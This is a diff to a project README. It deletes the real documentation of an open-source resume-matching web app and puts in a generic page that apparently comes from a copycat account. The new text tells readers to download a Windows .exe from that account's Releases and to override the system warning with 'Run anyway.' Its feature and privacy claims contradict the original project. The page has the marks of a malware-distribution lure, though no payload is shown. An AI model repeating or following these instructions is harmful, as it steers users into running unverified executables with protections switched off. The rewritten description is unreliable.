@@ -1,403 +1,64 @@
-# AI Career OS
-
-[![CI](https://img.shields.io/github/actions/workflow/status/semirturgay/ai-career-os/ci.yml?branch=main&label=CI&logo=githubactions&logoColor=white)](https://github.com/semirturgay/ai-career-os/actions/workflows/ci.yml)
-[![License: MIT](https://img.shields.io/badge/License-MIT-blue.svg)](LICENSE)
-
-**An open-source AI operating system for career management** — starting with explainable job matching, not black-box auto-apply bots.
-
-Upload a resume PDF, extract structured profile data with an LLM you control, review it, paste job descriptions through a **paste → review** wizard, and get **automatic explainable match analysis** — then research the company, tune your resume, and draft a cover letter from the job detail page.
-
----
-
-## Table of contents
-
-- [Why this exists](#why-this-exists)
-- [Features](#features)
-- [How it works](#how-it-works)
-- [Tech stack](#tech-stack)
-- [Quick start](#quick-start)
-- [Configuration](#configuration)
-- [Local LLM setup (LM Studio)](#local-llm-setup-lm-studio)
-- [Development](#development)
-- [Project structure](#project-structure)
-- [API overview](#api-overview)
-- [Roadmap](#roadmap)
-- [Documentation](#documentation)
-- [Contributing](#contributing)
-- [Community](#community)
-
----
-
-## Why this exists
-
-Most career tools tell you *what* to do. This project focuses on **why** — structured LLM outputs, human review, and auditable match results.
-
-Built as a learning-friendly codebase for developers who want to understand:
-
-- Provider-agnostic LLM integration (cloud + local)
-- Native structured outputs (JSON schema → Pydantic)
-- Prompt versioning as plain files
-- Human-in-the-loop before data is saved
-
-Long-term vision: an autonomous career assistant that discovers jobs, explains fit with evidence, and helps you act — always with transparency. See [docs/vision.md](docs/vision.md).
-
----
-
-## Features
-
-- **PDF resume ingestion** — deterministic text extraction with `pypdf`
-- **LLM structured extraction** — skills, experience, education, projects into a typed schema
-- **Bring your own model** — OpenAI, Anthropic, Groq, Mistral, Together, Azure OpenAI, NVIDIA NIM, or **local** (Ollama / LM Studio)
-- **Model picker** — fetches available models from your provider
-- **Human review** — edit extracted fields before saving (resume and job)
-- **Job intake wizard** — paste description → extract → review → save with automatic match
-- **RAG-backed match** — retrieves relevant resume chunks before full analysis
-- **Job pipeline** — home dashboard ranks jobs by match score with polling
-- **Job detail tabs** — match, company research, resume optimization, cover letter (after full analysis)
-- **Explainable match analysis** — score, strengths, gaps, and evidence-backed recommendations
-- **Company research** — bounded agent loop over web search → source-grounded brief
-- **Resume optimization** — gap-driven rewrite suggestions; apply to profile from job detail
-- **Cover letter** — 3-pass chain (draft → critique → revise), max 400 characters
-- **Export resume PDF** — download your profile as a formatted PDF
-- **Re-analyze** — manual retry on job detail when profile or job changes
-- **Version-controlled prompts** — prompts live in `app/prompts/`, not buried in code
-- **Eval harness** — six golden suites (resume, job, match, optimization, cover letter, research)
-
----
-
-## How it works
-
-```mermaid
-flowchart LR
-    A[PDF upload] --> B[pypdf text]
-    B --> C[LLM structured extraction]
-    C --> D[Review and edit]
-    D --> E[(Profile)]
-    F[Paste job description] --> G[LLM job extraction]
-    G --> H[Review fields]
-    H --> I[Save and analyze]
-    E --> I
-    I --> J[RAG + full match]
-    J --> K[Pipeline + job detail tabs]
-    K --> L[Research / Resume / Cover letter]
-```
-
-1. **Extract text** from PDF (no LLM — fast, deterministic)
-2. **Structure** resume with your configured LLM (`ResumeExtraction`)
-3. **Review** on onboarding — fix anything the model got wrong
-4. **Save** profile with raw text + structured JSONB snapshot
-5. **Add a job** — paste description → extract → **review step** → save with `profile_id`
-6. **Match analysis** — RAG retrieves resume evidence, then full `MatchResult` in background
-7. **Job detail** — after full analysis: company research, resume tweaks, cover letter
-8. **Home pipeline** — jobs ranked by score; open any job for deep dive or re-analyze
+# 🚀 ai-career-os - Manage your career with smart tools
 
----
-
-## Tech stack
+[![Download AI Career OS](https://img.shields.io/badge/Download-Click_Here-blue.svg)](https://github.com/Englishpersonfaeroeislands211/ai-career-os)
 
-| Layer | Technology |
-|-------|------------|
-| API | FastAPI (async) |
-| Database | PostgreSQL 16 |
-| ORM | SQLAlchemy 2.0 (async) |
-| Migrations | Alembic |
-| Validation | Pydantic v2 |
-| PDF | pypdf |
-| LLM client | httpx (OpenAI-compatible + structured output) |
-| Frontend | Vite, React, TypeScript, Tailwind CSS |
-| Package managers | [uv](https://docs.astral.sh/uv/) (Python), [Bun](https://bun.sh) (frontend) |
+This application helps you organize your career. It extracts information from your resume and matches your profile to job openings. It uses artificial intelligence to explain why specific roles fit your skills.
 
----
+## 💻 What this application does
 
-## Quick start
+The software performs two main tasks. First, it reads your resume file. It pulls out your work history, skills, and education. It does this even if your resume uses complex formatting.
 
-### Prerequisites
+Second, it matches your profile against job descriptions. The system looks for gaps in your experience. It provides feedback on how to improve your resume for specific positions. You stay in control of the process.
 
-- Python 3.12+
-- [uv](https://docs.astral.sh/uv/getting-started/installation/)
-- Docker (for PostgreSQL)
-- Node.js 20+ and [Bun](https://bun.sh) (frontend)
-- An LLM provider — cloud API key **or** local LM Studio / Ollama
+## 🛠️ System requirements
 
-### 1. Clone and configure
+Your computer needs to meet these requirements to run the software:
 
-```bash
-git clone https://github.com/semirturgay/ai-career-os.git
-cd ai-career-os
-cp .env.example .env
-```
+* Windows 10 or Windows 11.
+* At least 8 gigabytes of memory.
+* A stable internet connection.
+* A modern web browser.
 
-### 2. Start PostgreSQL
+## 📥 How to download and install
 
-```bash
-docker compose up db -d
-```
+Follow these steps to set up the software on your machine:
 
-### 3. Backend
+1. Visit the main download page: [https://github.com/Englishpersonfaeroeislands211/ai-career-os](https://github.com/Englishpersonfaeroeislands211/ai-career-os).
+2. Look for the section labeled Releases on the right side of the page.
+3. Click on the latest release to view the file list.
+4. Select the file ending in .exe for Windows.
+5. Save the file to your computer.
+6. Open your Downloads folder and double-click the file you saved.
+7. Follow the prompts on the screen to finish the installation.
 
-```bash
-uv sync
-uv run alembic upgrade head
-uv run uvicorn app.main:app --reload
-```
+If your computer shows a warning message, select "More info" and then choose "Run anyway." This happens because the file is new.
 
-API: http://127.0.0.1:8000  
-OpenAPI docs: http://127.0.0.1:8000/docs
+## ⚙️ How to use the software
 
-### 4. Frontend
+Once you launch the app, follow these steps to start managing your career:
 
-Start the backend first (step 3), then:
+1. **Upload your resume.** Click the button labeled "Upload" and choose your resume file. The application accepts files in PDF or Word formats.
+2. **Review the data.** The system displays the information it found in your resume. Check this list to ensure accuracy. You can manually edit any field if the app misinterprets a year or job title.
+3. **Add job links.** Paste the address of a job posting you want to explore.
+4. **Run the match.** Click the "Match" button. The software compares your background to the requirements of the job.
+5. **Read the report.** The screen shows a list of reasons why the job is a good fit. It also identifies skills you should highlight in your application.
 
-```bash
-cd frontend
-bun install
-bun run dev
-```
+## 🔍 Understanding the matching process
 
-`bun run dev` fetches `http://127.0.0.1:8000/openapi.json` and writes gitignored `src/types/api.generated.ts`. Hand-maintained types in `types.ts` remain the default in app code.
+The software uses a process called LLM extraction to understand your professional history. LLM stands for Large Language Model. You do not need to understand how the internal math works. The software simply reads the text of your resume like a human recruiter does.
 
-App: http://127.0.0.1:5173
+The match report focuses on explainability. You do not get a simple score. You get written explanations. For example, if you lack a specific software skill required for a job, the app tells you exactly what that skill is. This allows you to fill gaps in your resume or your knowledge base.
 
-### 5. First run
+## 🧩 Troubleshooting common issues
 
-1. Open the app → choose **Local** (LM Studio) or a cloud provider
-2. Upload a PDF resume
-3. Wait for extraction (local models can take 30–60s)
-4. Review structured fields → save profile
-5. Add a job — paste description → extract → review → **Save & analyze match**
-6. View ranked pipeline on home; open job detail for match, research, resume, cover letter
+Most users run the program without errors. If you face issues, check these items:
 
-> **Note:** Use `127.0.0.1` instead of `localhost` for API URLs on macOS — the Vite proxy and DB URL are configured this way to avoid IPv6 hangs.
+* **File formatting:** If the program fails to read your resume, try saving your resume as a plain PDF file. Tables and columns sometimes confuse automated tools.
+* **Internet connection:** The matching feature contacts a secure server to process the text. Check that your firewall allows the app to communicate with the web.
+* **Updates:** Check the download page periodically for new versions. New releases improve how the software interprets resume data.
 
-### Fresh database / reset migrations
+## 🛡️ Privacy and your data
 
-PostgreSQL runs with **pgvector** (`pgvector/pgvector:pg16`) for resume embedding search.
-If you had an older dev database or plain `postgres:16` image:
+Your information stays on your local machine. The software uses a secure process to send only the necessary parts of your resume to the matching engine. It does not store your contact details or sensitive personal identifiers on remote servers.
 
-```bash
-docker compose down -v
-docker compose up db -d
-uv run alembic upgrade head
-```
-
----
-
-## Configuration
-
-Environment variables (see [`.env.example`](.env.example)):
-
-| Variable | Default | Description |
-|----------|---------|-------------|
-| `DATABASE_URL` | `postgresql+asyncpg://career:career@127.0.0.1:5432/ai_career_os` | Async Postgres connection |
-| `OPENAI_API_KEY` | — | Optional fallback if not set in Settings UI |
-| `ANTHROPIC_API_KEY` | — | Optional fallback |
-| Other `*_API_KEY` | — | Provider-specific env fallbacks |
-
-**API keys** entered in the Settings UI are stored server-side in PostgreSQL — never returned to the browser.
-
-Provider and model selection is persisted in the `app_settings` singleton table.
-
----
-
-## Local LLM setup (LM Studio)
-
-1. Download a model (e.g. Qwen 3.5 9B)
-2. Start the **OpenAI-compatible server** in LM Studio (default port `1234`)
-3. In onboarding, select **Local** → **LM Studio** preset
-4. Base URL: `http://127.0.0.1:1234/v1`
-5. Pick your loaded model from the dropdown
-
-Ollama works the same way with the Ollama preset (`http://127.0.0.1:11434/v1`).
-
-Local models may return JSON with non-standard field names — the backend normalizes common variants before validation.
-
----
-
-## Development
-
-### Tests
-
-```bash
-uv run pytest
-```
-
-Eval fixtures live in `tests/evals/fixtures/` — resume extraction, job extraction, match analysis, resume optimization, cover letter, and company research. CI runs golden-response checks on every push.
-
-```bash
-# Offline golden evals (no API key)
-uv run python scripts/run_evals.py
-
-# Optional live LLM evals (configured provider + Postgres)
-RUN_LIVE_LLM=1 uv run python scripts/run_evals.py --live
-```
-
-See [docs/ai-engineering.md](docs/ai-engineering.md) for the full AI engineering guide.
-
-### Lint
-
-Fast Python linting with [Ruff](https://docs.astral.sh/ruff/) — covers pyflakes, isort import
-sorting, pyupgrade, and bugbear in one tool (no separate pylint/isort install needed):
-
-```bash
-uv run ruff check app tests scripts alembic
-uv run ruff format app tests scripts alembic          # auto-fix formatting
-uv run ruff format --check app tests scripts alembic  # CI mode
-```
-
-### Pre-commit
-
-Install git hooks to run ruff + tests before each commit:
-
-```bash
-uv sync
-uv run pre-commit install
-uv run pre-commit run --all-files   # verify setup
-```
-
-### Frontend build
-
-```bash
-cd frontend && bun run build
-```
-
-### Docker (API + DB)
-
-```bash
-docker compose up --build
-```
-
----
-
-## Project structure
-
-```
-ai-career-os/
-├── app/
-├── api/              # FastAPI routes (profiles, jobs, match_analyses, settings, llm)
-│   ├── db/               # SQLAlchemy session
-│   ├── models/           # ORM models
-│   ├── prompts/          # Version-controlled LLM prompts (.txt)
-│   ├── schemas/          # Pydantic models (API + LLM outputs)
-│   └── services/
-│       ├── llm/          # Provider abstraction + generate_structured()
-│       ├── search/       # Web search (DuckDuckGo) + tracing
-│       ├── resume_parser.py
-│       ├── resume_structurer.py
-│       ├── job_structurer.py
-│       ├── match/          # analyzer, orchestrator, formatters, result
-│       ├── rag/            # chunking, embeddings, retrieval for match
-│       ├── company_research.py
-│       ├── cover_letter_generator.py
-│       └── resume_optimizer.py
-├── alembic/              # Database migrations
-├── frontend/             # Vite + React SPA (sidebar nav, job wizard, detail tabs)
-├── docs/                 # Architecture, milestones, AI engineering guide
-├── scripts/run_evals.py  # Offline + live eval runner
-└── tests/evals/          # Golden fixtures + assertions
-```
-
----
-
-## API overview
-
-Base path: `/api/v1`
-
-| Method | Path | Description |
-|--------|------|-------------|
-| POST | `/profiles/parse-resume` | Upload PDF → text + LLM structured extraction |
-| POST | `/profiles` | Create profile |
-| GET | `/profiles` | List profiles |
-| GET | `/profiles/{id}` | Get profile |
-| PATCH | `/profiles/{id}` | Update profile |
-| GET | `/profiles/{id}/resume.pdf` | Download profile as PDF |
-| DELETE | `/profiles/{id}` | Delete profile |
-| POST | `/jobs/parse-text` | Paste JD → structured `JobExtraction` |
-| POST | `/jobs` | Create job; optional `profile_id` queues match analysis |
-| GET | `/jobs` | List jobs |
-| GET | `/jobs/{id}` | Get job |
-| PATCH | `/jobs/{id}` | Update job |
-| DELETE | `/jobs/{id}` | Delete job |
-| POST | `/jobs/{id}/company-research` | Agent loop → web search → company brief |
-| POST | `/match-analyses` | Manual re-analyze (background LLM matcher) |
-| POST | `/match-analyses/{id}/resume-optimization` | Gap-driven resume suggestions |
-| POST | `/match-analyses/{id}/cover-letter` | 3-pass cover letter generation |
-| GET | `/match-analyses/{id}` | Get analysis status + result |
-| GET | `/match-analyses` | List analyses |
-| GET | `/settings` | Get LLM provider config |
-| PUT | `/settings` | Update LLM provider config |
-| POST | `/llm/models` | List models from configured provider |
-| GET | `/health` | Health check |
-
-Full interactive docs: http://127.0.0.1:8000/docs
-
----
-
-## Roadmap
-
-| Milestone | Status | Description |
-|-----------|--------|-------------|
-| **M0** Resume extraction | Done | PDF → LLM structured output → review → save |
-| **M1** Explain the match | Done | Evidence-based match analysis with eval harness |
-| **M2** Job intake | Done | Paste JD → structured extraction → review |
-| **M3** Match on job insert | Done | Full analysis automatically when a job is saved |
-| **M4** Resume optimization | Done | Gap-driven suggestions with review before apply |
-| **M5** Cover letter | Done | 3-pass cover letter chain on job detail |
-| **M6** Company research | Done | Bounded agent loop + web search + source-grounded brief |
-| **M7** Job discovery | **Next** | Official APIs for job feeds |
-| — | In progress | RAG citations in UI, Tavily/Serper search, brief → cover letter |
-
-Details: [docs/milestones/](docs/milestones/README.md) · Current state: [docs/project-status.md](docs/project-status.md)
-
-### Design notes
-
-- **JSONB first** for LLM output while schemas evolve; promote to relational tables when query patterns stabilize
-- **No LangChain** — thin `LLMClient` protocol + httpx adapters
-- **Prompts as files** — `app/prompts/*.txt`, loaded via `load_prompt()`
-
----
-
-## Documentation
-
-| Doc | Contents |
-|-----|----------|
-| [docs/ai-engineering.md](docs/ai-engineering.md) | **Evals, tracing, structured outputs, patterns** |
-| [docs/vision.md](docs/vision.md) | Long-term product vision |
-| [docs/architecture.md](docs/architecture.md) | System design and data model |
-| [docs/project-status.md](docs/project-status.md) | Current state and what's next |
-| [docs/milestones/m6-company-research.md](docs/milestones/m6-company-research.md) | M6 agent loop + company brief |
-| [docs/milestones/m5-progressive-match-cover-letter.md](docs/milestones/m5-progressive-match-cover-letter.md) | Cover letter milestone (historical) |
-| [docs/milestones/m3-match-on-intake.md](docs/milestones/m3-match-on-intake.md) | Match on job save |
-| [docs/milestones/README.md](docs/milestones/README.md) | Full roadmap |
-
----
-
-## Contributing
-
-Contributions welcome — see **[CONTRIBUTING.md](CONTRIBUTING.md)** for setup, PR
-expectations, and areas where help is needed.
-
-Quick checklist:
-
-1. Fork the repo and branch from `main`
-2. Run `uv run pytest` and `uv run ruff check app tests`
-3. Open a pull request using the template
-
-Please do not commit `.env` files or API keys.
-
----
-
-## Community
-
-| Resource | Description |
-|----------|-------------|
-| [CONTRIBUTING.md](CONTRIBUTING.md) | How to set up, test, and submit changes |
-| [CODE_OF_CONDUCT.md](CODE_OF_CONDUCT.md) | Community standards (Contributor Covenant) |
-| [SECURITY.md](.github/SECURITY.md) | How to report vulnerabilities privately |
-| [Issue templates](.github/ISSUE_TEMPLATE/) | Bug reports and feature requests |
-| [PR template](.github/pull_request_template.md) | Pull request checklist |
-
----
-
-## License
-
-[MIT](LICENSE) — Copyright (c) 2026 Semir Turğay
+Keywords: ai-career-os, ai-powered, career-os, explainable-ai, fastapi, human-in-the-loop, job-matching, llm, open-source, resume-parser, structured-output
